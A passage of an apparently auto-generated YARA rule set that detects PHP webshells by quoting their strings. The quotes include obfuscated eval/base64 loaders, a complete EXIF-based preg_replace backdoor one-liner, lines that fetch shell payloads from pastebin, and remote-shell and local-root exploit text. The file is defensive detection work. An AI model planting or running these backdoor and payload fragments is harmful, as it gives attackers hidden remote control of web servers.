      date = "2019-02-23"
      hash1 = "af1e6ced900cc6ce02a29b2de92c4254263b7c9bab64ad41262cb08ffebff8f4"
   strings:
      $s1 = "eval(gzuncompress(base64_decode(\"eJzsvXl3U0fSMP43OSff4XLHTyTHshbvCzIY7+ANL6zm+Gi5soUlXaHFCxme45Cwr5mEJCQkQAITJguQZQIYCN/lHV/Z/m" ascii
      $s2 = "nv9HDnUA8cIuRu+nBQPoaXDhAJqa/wAfibqxR/XLBQadl4hWzpdYFwcfspyakoVkhCiCmDQFm1g2nBK5eDidZS82qHrKotWxZ1FGqHrB/BotAzkHi8QkrzupzqsusOte" ascii
      $s3 = "1PLvpOsTCBPH0mAxtitJZJIG1/8rOfdv5N0zTocxIQGgf2EYAa9Lk2ocVybfj9zTfGu8ZGBgd3d47V9nZ29dR2jQyOjLUpf6qrx//aFSu7f6CvfxD+TZSUkYGM93d2jx" ascii
      $s4 = "Aookc11DO8o82HEm51p+pVO3g2zz26YyeqoWQoVYSIYFBNLmWPJ4DSUyruZdtwpcwFd7FUpJAUI/tZPZvzsP7AeoS9YkHPRBEz23D6t7M6gET4vq0KQRH3dsGEFS4/MF" ascii
      $s5 = "XCvdGOjGYga0H5Qd0xQ2FLVZbUg5DAItkXLlXMOzphfkR6NJSYJ0xCspgET5hUPTow6WIRJaeyp/MQURtdGNUq0TOBFGLeYdYb1sLu7HVFO0vM2RcVXQmCGEiRSAKFLF" ascii
      $s6 = "qANXEIoyUpVXAkRT2VCtS+/vLm2v2L/BW1UvZJgcGlrZyeEYeK8vPiiGAA6XXB+oRhmWGuefjwv1+EKaRwNxvLn62/PFuGvJ1WKEWFLZz/rnDVSdAo4u+0rqgOLqYHy8" ascii
      $s7 = "8rLpeX+5tSFhrI4CfVbGYbf8QU+56acbMemXnbqE9HsMpRChZhDpCKkh6AHEBMWDR0DmorsOQaNojCsWTbNjJNVwiIOSd8VpgETxKXneoSuYyGT81rCXxtnvtCJJcwIP" ascii
      $s8 = "/8tvbjzztRa7pyXU4yPvhqJ/SFTp6UxEJ/3IYSmGexPWsabLb7waALL0r0OZeQ4GFZkApGXiYek8cmaX+HguWBktMC3r9w6YEy0PRMvp2BRtn2MpNkgimZSSrZTCSIRj" ascii
      $s9 = "OB1JDQ4zkFT2H/os6a+NUW0+X3JrUOf7/GfgRQ/+XbkXQIKKVP1oH/CfL8V45c7EBFR5r/kNFn4zmNPYJi24S76PWACvvwH4UMs33eV0UuN5PRtFRHmY79j6Hvj+YWRX" ascii
      $s10 = "Fze/jtmANGc1ZwuC+wW39lpd3usMu6FAod+Ssrt90oQF7tcmD24KOLOyv67RfYa7+y8nF6Q3vsyUOelSGgsx4YAO95Vgag3PPv2zuPClS1T74ot9/fHx+PjsRoKHrNoa" ascii
      $s11 = "Izo6Oxwd3pQ43Ha9Jad7920B9dqo8uzHX7IjF9om+w5XBdvmn+4LHweNOxmgPhkbmmQGBifrT18GBv68DB7pQ2mcmdODQZ3Rvd0zqSa+3cPz9WB7OdbRrpgc1k797JTK" ascii
      $s12 = "aS69pOpSQRRA9X/96eQ9ODI12dg9NDnV39A8M9U+OHxid6hqa68pkM7HfobpvRE+Nabop/nJrQMnC8DiWUcRakZOpANDuViaYXolMT8CkXSU+N6pncMDPnM/sXR99gpw" ascii
      $s13 = "I4pOGeA8rheLrdTMPqWRAoOlmLqgkO1h9064j/aLVVtrYDjpdus5YnIPKQmpAlsTK4VtjMiFyp26ptsrzQUzZbFkokYNQ8ZeMv53u2UDqdiEdCSLU+PZLTcrWw/2mhpE" ascii
      $s14 = "loB5NZW+Y4MIONw2KWuKLNggQGA0G51agWC+UTuSnvn+OpqLYIf5ksDH/D4Sz8hkLwe1ZLpOEPPbXDPmC4EPgQAbkM/+CpGv4y2RL+RuNL8Dulwy99Dr9rCfidPY6/Wf" ascii
      $s15 = "$admin['pass']  = \"falling!@#\";  //" fullword ascii
      $s16 = "c1tbYiq8MiaPSYynUguzvKCNFxGETRU5ykp0yaFkbNPGQYAmWT9odASv5RkEqj5EnRT7jeRSiBYfvCLHq67F/RtKC0t8rM4lvcAsBxKgUNv1b3OuQt/U+QrKciIMzMMe" ascii
      $s17 = "EVNgOSacfNwqHszRK+gNMy8Zs9xlsx0ofZVh8//WKTaFrlxLutWkt74YKbj26/rwtupDNypTklFtmAA7cQGeWAdVfbtOHhfr5+eHzQyw0BmOjlGsAaJ2SxPOzEHuBOXD" ascii
      $s18 = "nA+Z3TRXGAO5dJ0UVLTWafcT6ESMmg0jHCCnTHX//9k5qNIMrBkqMrpbGzGQHB1QBkAXoYYCxISoaoO8o02X1+PDg9MuMPhD27AXAY5v6KFAEJnKXukSn/eRPNgHhTlm" ascii
      $s19 = "g654orxrKQLG+Q9Eqxs2auYqQcOsCVDzlUoj8p//ooU43wazKPULd6XPQKg8MjDKqTQ83DxxS5QwbvNv56qq14Y6t2tMGxHhktMj6rFLKIxlR838bHUfdK4yg5q8vvrp" ascii
      $s20 = "5KIr6//uARNn3mxsbyMvTSg152526gjcHN++SxjRfc12+sPrlIwQwLN78lSz0MUMBihHg376epLIBKgFD+iOdn7/OIag4aT8C6B2dCJsV6RopuilUC/yeAUS/ygb78FN" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule php17_21
{
   meta:
      description = "php17 - file 21.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7ea5be5d453dc683a4cc01d3e822ab6dafdd3aaddcdde2f1fed4678945145b74"
   strings:
      $x1 = "print \"URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>\";" fullword ascii
      $x2 = "$url_target = \"Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>\";" fullword ascii
      $x3 = "$act = color(1, 2, \"Uploaded!\").\" at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>\";" fullword ascii
      $x4 = "$url_target2 = \"Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>\";" fullword ascii
      $x5 = "$url_target = \"Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>\";" fullword ascii
      $x6 = "$response = curl(\"http://domains.yougetsignal.com/domains.php\", TRUE, \"remoteAddress=\".$GLOBALS['SERVERIP'].\"&ket=\");" fullword ascii
      $x7 = "$cek_login2 = file_get_contents(\"$target/lokomedia/adminweb/\");" fullword ascii
      $x8 = "$cek_login4 = file_get_contents(\"$target2/lokomedia/adminweb/\");" fullword ascii
      $x9 = "$url_target2 = \"Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>\";" fullword ascii
      $x10 = "$cek_login3 = file_get_contents(\"$target2/adminweb/\");" fullword ascii
      $x11 = "$url_target = \"Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>\";" fullword ascii
      $x12 = "$url_target = \"Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>\";" fullword ascii
      $x13 = "print \"Login Adminer: <a href='\".$GLOBALS['FILEPATH'].\"/adminer.php' target='_blank'>http://\".$_SERVER['HTTP_HOST'].\"/\".$G" ascii
      $x14 = "print \"Login Adminer: <a href='\".$GLOBALS['FILEPATH'].\"/adminer.php' target='_blank'>http://\".$_SERVER['HTTP_HOST'].\"/\".$G" ascii
      $x15 = "elseif($name === \"cgitelnet2\") $get = array(\"https://pastebin.com/raw/aKL2QWfS\", \"idx_cgi/cgitelnet2.idx\");" fullword ascii
      $x16 = "elseif($name === \"cgitelnet1\") $get = array(\"https://pastebin.com/raw/Lj46KxFT\", \"idx_cgi/cgitelnet1.idx\");" fullword ascii
      $x17 = "$cek_login = file_get_contents(\"$target/adminweb/\");" fullword ascii
      $x18 = "if($name === \"adminer\") $get = array(\"https://www.adminer.org/static/download/4.3.1/adminer-4.3.1.php\", \"adminer.php\");" fullword ascii
      $x19 = "elseif($name === \"webconsole\") $get = array(\"https://pastebin.com/raw/2i96fDCN\", \"webconsole.php\");" fullword ascii
      $x20 = "$url_target = \"Login => <a href='$target' target='_blank'><u>$target</u></a><br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*)
}

rule AnyGetter
{
   meta:
      description = "php17 - file AnyGetter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7d2e467c5a560460d3e4a34801aee4f580d3ab73c930d41c875c95ffd4c1f670"
   strings:
      $s1 = "$forwardObject = $element->$forwardGetter($forwardParam);" fullword ascii
      $s2 = "$forwardGetter = 'get' . ucfirst($this->forwardAttribute);" fullword ascii
      $s3 = "* @param mixed $forwardAttribute" fullword ascii
      $s4 = "$valueContainer = $c->getLabeledValue($forwardObject);" fullword ascii
      $s5 = "* @param mixed $forwardParam1" fullword ascii
      $s6 = "$forwardParam = $this->getForwardParam1();" fullword ascii
      $s7 = "namespace Pimcore\\DataObject\\GridColumnConfig\\Operator;" fullword ascii
      $s8 = "$targetValue = $o->$getter($this->getParam1());" fullword ascii
      $s9 = "if (method_exists($element, $forwardGetter)) {" fullword ascii
      $s10 = "$this->forwardAttribute = $config->forwardAttribute;" fullword ascii
      $s11 = "public function getForwardAttribute()" fullword ascii
      $s12 = "public function getForwardParam1()" fullword ascii
      $s13 = "$newValues[] = $targetValue;" fullword ascii
      $s14 = "$this->forwardParam1 = $config->forwardParam1;" fullword ascii
      $s15 = "$o = $value; // Concrete::getById($value->getId());" fullword ascii
      $s16 = "* @param mixed $returnLastResult" fullword ascii
      $s17 = "public function setForwardParam1($forwardParam1)" fullword ascii
      $s18 = "public function setForwardAttribute($forwardAttribute)" fullword ascii
      $s19 = "class AnyGetter extends AbstractOperator" fullword ascii
      $s20 = "private $forwardAttribute;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_2011__2_
{
   meta:
      description = "php17 - file 2011__2_.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c8bf9b5705932c5daf06806e32f65cc2c32e0f32949ff585882d80e94776a8ac"
   strings:
      $x1 = "<a href=\"javascript:g('shell');\">Execute Command</a> | " fullword ascii
      $s2 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#f00;\">Close</span></li>');" fullword ascii
      $s3 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#080;\">Open</span></li>');" fullword ascii
      $s4 = "<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s5 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:g('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s6 = "<span style=\"float:right;\">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>" fullword ascii
      $s7 = "p($comma.'<a href=\"javascript:godir(\\''.$drive->Path.'/\\');\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');" fullword ascii
      $s8 = "secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s9 = "$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(\", \", $row).');'.\"\\n\";" fullword ascii
      $s10 = "mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s11 = "2011</a>. Copyright (C) 2004-2011 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Re" ascii
      $s12 = "$tabledump = \"DROP TABLE IF EXISTS `$table`;\\n\";" fullword ascii
      $s13 = "Powered by <a title=\"Build 20110419\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s14 = "mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s15 = "<a href=\"javascript:g('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s16 = "secparam('Supported databases', implode(', ', $temp));" fullword ascii
      $s17 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s18 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s19 = "Powered by <a title=\"Build 20110419\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s20 = "scookie('loginpass',encode_pass($password));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_2016_06_01_233353_create_locations_table
{
   meta:
      description = "php17 - file 2016_06_01_233353_create_locations_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "974994ec4b6ee07c55d2f5ae9c4adaa780cd9d5e6de9e32b635e99f150beb919"
   strings:
      $s1 = "$table->integer('user_count')->default(0);" fullword ascii
      $s2 = "$table->integer('order')->default(0);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule _role_v1_public
{
   meta:
      description = "php17 - file _role.v1.public.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6a25ee6cf44e64d08de9fc382336d8a7859d48ffc6872d15593ba3afcc40a9bc"
   strings:
      $s1 = "* @apiSuccessExample {json} Success-Response:" fullword ascii
      $s2 = "* @apiDefine RoleSuccessSingleResponse" fullword ascii
      $s3 = "\"description\":null," fullword ascii
      $s4 = "\"name\":\"est-sit-voluptatem\"," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_1fee21faf71e25004d3487a46c62a41caa60daff
{
   meta:
      description = "php17 - file 1fee21faf71e25004d3487a46c62a41caa60daff.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d61b762fac78ac5c0c1559f1a07b3b34c659acec3199dab8cce4f15bc8c164de"
   strings:
      $s1 = "tOTcYXacYXacYXMupLtoQv6WDNyUzAkxBMTNAeEyBMFxdJGxG+ilbVTcYOFWbufWd+GxG+W1tOTcbufWYXacYJklbVFWbVFWYOFWsJ8cbuacbufWYOF1tOFWYXacYOFW" ascii
      $s2 = "getNwl0CgeGjYUwVwbzNYO6OYXOjYXOuYX0E2Uf9YO0EgXOW8ltN8l8J8OGWgbya2bQEYu0jwbli2bayYOGE2XfCYOeWgbOEYeYW8UOjYXlEwuGuYOOWYVzN8lzN8ltN" ascii
      $s3 = "0+klD38rpNORgWVsS301sJyZDBaVPAklBMaceM8DtCTMpN8mDJppsAlkt+01G36/QL87sJ8oeOTb6ymxDBarpNkxBAlRswVsPWVstLyMzBt7GXVktV2A8eye8AaewetY" ascii
      $s4 = "GJYigXkigXk5owVsJwltdvERQ98+zja5zvTIpJMv03MRDLlhtCEM0CZl0AaxQvyIzNexdL8rSNT/0AE1z3ECzB8R0COm0BtR03WmtCtRpL2VQv6rDAaCzBtrGL2rDxYx" ascii
      $s5 = "YbzXwukWgOYC8bzO8l8N8eyOYX0i8b0MgXYVgbaXYXrX2uwEYbkEwl6JYbOWYV2y8O8XgXaX2XlVYbOVYbkEYUQC8XwMYU6XwbGM8bku2UOiwbfEYeyyYXOigO8Ngb2J" ascii
      $s6 = "2Ueu8OGi2UrX2XwEYeGV2e2J8XkEYUYuYufMwukEYuYMwuk7gXYV2bO98UfV2UOW2uwjwbyJYUfC2be9gXYu2U2a2UYEgbrXwUfE2OtOwbeV2UyX2bkC2X0WwUw9wVGE" ascii
      $s7 = "RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODkrLycpKSk7ZXZhbCgkT08wME8wME8wKTs=')));return;?>" fullword ascii
      $s8 = "sb/+Qv6rSum2Jv2rQCekt9Gxg+a2PB2EDyT2QCQ1sb/+Qv6rSum2Jv8ZzvyMDLwhGypRDlMrS3i1sb/+Qv6rSum2JxV2Jk==" fullword ascii
      $s9 = "gO0W2ety2beiwUaa8lYuwl092V2J2XkMYXOC8l0W2OeMwUGuYuYuwukE8lzN8OyO2baJwb2X2ueV8XG7YOej8UQMYXeCwe0C2brywUf7geGWgetagbtXYuwiwuY72V0M" ascii
      $s10 = "2UaO8U09gXkV2e6J8eGVgXGEYXkuwlYjYXtywUYM8X0i2btyYXl72uyJYUf7gbf72U078UfiwVwj8O0W8eYC2Uk7YXlW2bf9YXzN2bOV8eGW8bG72lOVYX2XYOOCgetN" ascii
      $s11 = "eOTb6ymxQNyjpJppd+tQoytBweMybO2OeyEjBNi+gWVstN8ZDN8nD3yRD+fTGJG/8O6Y868y8OT2weZgBLtQD+GIG+MteXVWdUfIYJiWBLtQD+GIG+awD9tVbvFTYUyQ" ascii
      $s12 = "S37VS3MZsb/TXwRRz+krz3MWpLl1tyTNAeEyeMmxp3zWtMMDtC7rD3exBAlRPCZvsJ8oeOTb6ymxp3zItMVkGbVktjQRGJ8MQNzRDN6I03MZGXVktyTwbM2e3jpMzvix" ascii
      $s13 = "gOeCwU0i8l0uYXaJ2uwCwueM2le92u2XYVwVgOw92Upy8OyX2VY9YXwE2lYCwuaa2XzJYezJ2XYj8XpJgetyYbzN2lwC8Xf7YuYC8bpOwe2JYukM2b07gXGC2u2NwUaJ" ascii
      $s14 = "wl2X2bG9YVyOwuY9YXOVYu6XYbw9wuG7gbkMYXw92b0i8XpXYXpNwUtOYb0jwl07YO2a8XGVYX0WYXw9YVGMwUG7YOejwUyy2V2a2b6ygbaXYVGCwVOEYeYM2UfM2Ukj" ascii
      $s15 = "Yb8a2U0WwUfu2XyJ2XryYezyYXYuYbYW8eGC2byOwlOugbpOYbw98bOWgOyJYUe7YuzX2bOVYbfMwb0CwU098O0VYuzyYeOEYewMgbyOYb0EwufjgXzOgbrX8XlEgXyN" ascii
      $s16 = "tL2npBaI03MZGXVktyTwbM2e3jpjzB6WtMMDtNZpgC6mQCektL2npBaI03MZGXVktyTNAeEyeMmxQCTMQJpp3jpI03MZtMMDtN/ZP6V5Xw1lb62L3j8RBAfTGOzRDN6o" ascii
      $s17 = "YO8XgbzyYetOYOGi2OyN8UpaYbQM2uQWYuwWwbZOgXfWwu6JYOOj2eYEYX0i8XyJgblW2UkW2Ota2XaN8ezJ2UQWYOwM2XaaYOO9YXfVYXeiYXwugX2NwU0EYuaNYleE" ascii
      $s18 = "GOtYbVGRgjQ5Xw1tS30103YkcbVktCGxsAalDC2MD36IpJ7xzB8yDN6/z37VwxZtzJkxDx2EDJQRdxzrDL6ZGXVktV2A8eye8AaOw68awlyb8AaI03MZgjQ5Xw1tS301" ascii
      $s19 = "wU0Wwl0EgO0MwVtO2bZa2bGj2b0WYXeMYXOCwUw9wuyJwbYWYbYE2ueW8bfMYXzO8X0MwU2aYVGMgbOj2bpOgetOYXpagOwC8XlWwUYW2Xf72U2X2u0jgbO72baJwlzO" ascii
      $s20 = "Bb/ZDL2ZGJ8MQNzRDN6I03MZGXVktyTNAeEyeMmxp3zWtMMDtC7rD3exBbmlb62LBVtc3JfTGOzRDN6o6Bf1tyTNAeEyeMmxp3zWtMMDt98/QyTI03MZtMVm8vZmz6Tb" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      8 of them
}

rule sig_65b7d5266f36590de1a62d7cbb82c5edba0d0171
{
   meta:
      description = "php17 - file 65b7d5266f36590de1a62d7cbb82c5edba0d0171.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1f5b4dfec093b8b289699ccad7aef89c6c5e863030671e978c8a95c68de2d1dc"
   strings:
      $s1 = "<?php $exif=exif_read_data('./lol.jpg');preg_replace($exif['Make'],$exif['Model'],'');?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_1c65f1a1bada9fbf9ed36b8258593541c096c400
{
   meta:
      description = "php17 - file 1c65f1a1bada9fbf9ed36b8258593541c096c400.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fc430b4089541b3cef0c96eb3037a4375f46a20e16e8340eb5ece6b0b9c95b25"
   strings:
      $s1 = "$sbp = $vbl(\"ctw\",\"\",\"ctwcctwrectwatctwectw_fctwuncctwtctwioctwn\"); " fullword ascii
      $s2 = "$vbl = str_replace(\"ti\",\"\",\"tistittirti_rtietipltiatice\"); " fullword ascii
      $s3 = "$mpy = $sbp('', $bkf($vbl(\"b\", \"\", $ka.$pjt.$uf.$iqw))); $mpy(); " fullword ascii
      $s4 = "$bkf = $vbl(\"k\", \"\", \"kbakske6k4k_kdkekckokdke\"); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_2008
{
   meta:
      description = "php17 - file 2008.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6e0ea4ea135950956996df7e86fed9c7f7d77ff89aa1843ec5290ab38e638da4"
   strings:
      $x1 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $x2 = "p('<p><a href=\"http://www.4ngel.net/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x3 = "Copyright (C) 2004-2008 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $s4 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s5 = "r: 2008</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" fullword ascii
      $s6 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:goaction('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s7 = "scookie('phpspypass', '', -86400 * 365);" fullword ascii
      $s8 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s9 = "<a href=\"javascript:goaction('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s10 = "$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');" fullword ascii
      $s11 = "dbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s12 = "dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s13 = "<td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\"" ascii
      $s14 = "makeinput(array('title'=>'Command','name'=>'command','value'=>$command));" fullword ascii
      $s15 = "scookie('phpspypass', $password);" fullword ascii
      $s16 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s17 = "<a href=\"javascript:goaction('logout');\">Logout</a> | " fullword ascii
      $s18 = "href=\"javascript:settable(\\''.$table['Name'].'\\', \\'drop\\');\">Drop</a> ]</td>');" fullword ascii
      $s19 = "$mysqldata .= sqldumptable($currow[0]);" fullword ascii
      $s20 = "> <input class=\\\"bt\\\" type=\\\"submit\\\" name=\\\"downrar\\\" value=\\\"Export selection table\\\" /></td></tr>\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_6291c0df3b06048508a5764b9025f68105ccea92
{
   meta:
      description = "php17 - file 6291c0df3b06048508a5764b9025f68105ccea92.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "20e6f705f72db86e7171fb1b6df4b9c8f7b49b7d184c58c548617ec3dae86d93"
   strings:
      $x1 = "fputs($f,\"Enter on ftp:\\nFTPhosting:\\t$host\\nLogin:\\t$login\\nPassword:\\t$password\\n \");" fullword ascii
      $x2 = "&nbsp;&nbsp;<b>Glftpd DupeScan Local Exploit <u>File 2</u></b> (binary file to run - <u>$private[3]</u> )</td></tr>" fullword ascii
      $x3 = "&nbsp;&nbsp;<b>Glftpd DupeScan Local Exploit <u>File 1</u></b> (binary file to run - <u>$private[2]</u> )</td></tr>" fullword ascii
      $x4 = "&nbsp;&nbsp;bindtty.c - remote shell on 4000 port, with rights of current user (id of apache)<br>" fullword ascii
      $x5 = "efault listening port is 31337 - connect to it with your favotite IRC client and set a password<br>" fullword ascii
      $x6 = "fputs($f,\"Decrypted MD5 hash [$pass_de] = $word\\nBruteforce start:\\t$dat - $date\\Bruteforce finish:\\" fullword ascii
      $x7 = "# echo \"<tr><td align=center bgcolor=#FFFFCC><b>&nbsp; \".exec(\"rm -f s\").\"</b> Removing file<u>s</u> now...</td></tr>\";" fullword ascii
      $x8 = "&nbsp;&nbsp;lGlftpd DupeScan Local Exploit - private local root exploits for Glftpd daemon <br>" fullword ascii
      $x9 = "else { open_file(\"dump_\".$dte.$tbl[$i].$fc.\".sql\".$gz);write_file($temp.\"\\n\\n\");close_file();$nbf=1; }" fullword ascii
      $x10 = "&nbsp;&nbsp;<b>FTP bruteforce</b>(full bruteforce, you are only to enter a value of number of passwords and brute will begin fr" fullword ascii
      $x11 = "<tr><td bgcolor=#FFFFCC><br><b>NetworkFileManagerPHP</b> - script to access your host in a best way</font><br><br>" fullword ascii
      $x12 = "&nbsp;&nbsp;localroot root linux 2.4.* - Exploit do_brk (code added) - gains local root priveleges if exploited succes<br>" fullword ascii
      $x13 = "<dd><b>Compilation, installing and running psybnc:</b> make // making psybnc // ./psybnc // You may edit psybnc.conf with NFM, D" ascii
      $x14 = "t=black bordercolordark=white><tr><td align=center>\".$g[1].\":\".$g[1].\" - <b>failed</b></td></tr></table>\";" fullword ascii
      $x15 = "global $action,$private_site, $title_exp,$login, $host, $file, $chislo, $proverka;" fullword ascii
      $x16 = "echo \"<tr><td align=center bgcolor=#FFFFCC><b>&nbsp; \".exec(\"./s\").\"</b> now running to 4000 port</td></tr>\";" fullword ascii
      $x17 = "<tr><td> <font color='#FFFFCC' face='Tahoma' size = 2>Directory <u><b>$fullpath</b></u>  \".exec(\"tar -zc $fullpath -f $pass.ta" ascii
      $x18 = "&nbsp;&nbsp;<b>psyBNC version:2.3.2-4</b> - psyBNC (binary file to run - <u>./psybnc</u>)</td></tr>" fullword ascii
      $s19 = "global $status,$form,$action,$name,$email,$pole,$REMOTE_ADDR,$HTTP_REFERER,$DOCUMENT_ROOT,$PATH_TRANSLATED,$HTTP_HOST;" fullword ascii
      $s20 = "<br><center><font color=red>You forgot to check tables, which you need to dump =)</b></font></center>\\n$footer\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule sig_008bd5ad93b754d500338c253d9c1770
{
   meta:
      description = "php17 - file 008bd5ad93b754d500338c253d9c1770.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "510e20b5d1110ca6369d2c5d1a6cc610068aa2ba6efdb03810a86411f82d3e87"
   strings:
      $x1 = "<font size=2><a href=\"<?=$PHP_SELF?>?action=cmd&method=<?=$cmd_method?>\">Exec commands by PHP</a></font>" fullword ascii
      $s2 = "if (@shell_exec($cmd)) { $this->output_state(1, \"shell_exec\"); $sys = true; $this->cmd_method = \"shel_exec\"; } else { $t" fullword ascii
      $s3 = "if (@passthru($cmd)) { echo \" -->\"; $this->output_state(1, \"passthru\"); $sys = true; $this->cmd_method = \"passthru\"; } e" fullword ascii
      $s4 = "echo \"<script> alert(\\\"you have a mysql error:\\\\n \".mysql_error().\"\\\\n\\\\nbecause of this the mysql exploiting will b" fullword ascii
      $s5 = "<font size=2><a href=\"<?=$PHP_SELF?>?action=cmdbrowse\">Exec browse by PHP</a></font>" fullword ascii
      $s6 = "if (@file_get_contents($file)) { $this->output_state(1, \"filegetcontents\"); $sys = true; } else { $this->output_stat" fullword ascii
      $s7 = "echo \"<font color=\\\"green\\\" size=2>[executable] \";  } else { echo \"<font color=\\\"red\\\" size=2>[not executable]\";  }" fullword ascii
      $s8 = "<option value=\"shell_exec\" <? if ($method==\"shell_exec\") { echo \"selected\"; } ?>>shell_exec</option>" fullword ascii
      $s9 = "if (@exec($cmd)) { $this->output_state(1, \"exec     \"); $sys = true; $this->cmd_method = \"exec\"; } else { $this->output_" fullword ascii
      $s10 = "<br>PHP Shell Support by <a href=\"mailto:admin@bansacviet.net\">DTN</a> " fullword ascii
      $s11 = "echo \"<font color=\\\"green\\\" size=2>[executable] \"; } else { echo \"<font color=\\\"red\\\" size=2>[not executable]\"; }" fullword ascii
      $s12 = "if (@readfile($file)) { echo \" -->\"; $this->output_state(1, \"readfile\"); $this->read_method = \"readfile\"; $sys = true; }" fullword ascii
      $s13 = "<form enctype=\"multipart/form-data\" action=\"<? print \"$PHP_SELF?action=explorer&dir=$dir&do=upload\"; ?>\" method=post>" fullword ascii
      $s14 = "if (@show_source($file)) { echo \" -->\"; $this->output_state(1, \"show_source\"); $this->read_method = \"show_source\"; $sys " fullword ascii
      $s15 = "if (@system($cmd)) { echo \" -->\"; $this->output_state(1, \"system   \"); $ss = true; $sys = true; $this->cmd_method = \"sys" fullword ascii
      $s16 = "if (@system($cmd)) { echo \" -->\"; $this->output_state(1, \"system   \"); $sys = true; $this->cmd_method = \"system\"; } else" fullword ascii
      $s17 = "echo \"File \".$HTTP_POST_FILES[\"userfile\"][name].\" succesfully uploaded.\";" fullword ascii
      $s18 = "or die(\"Error uploading file\".$HTTP_POST_FILES[\"userfile\"][name]);" fullword ascii
      $s19 = "if ($this->system_checks(\"/bin/ls\")) { $this->output_mainstate(1, \"system checks\"); } else { $this->output_mainstate(0, " fullword ascii
      $s20 = "echo \"\\n\\n<!-- MYSQL ERROR:\\n\".mysql_error().\"\\n-->\\n\\n\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
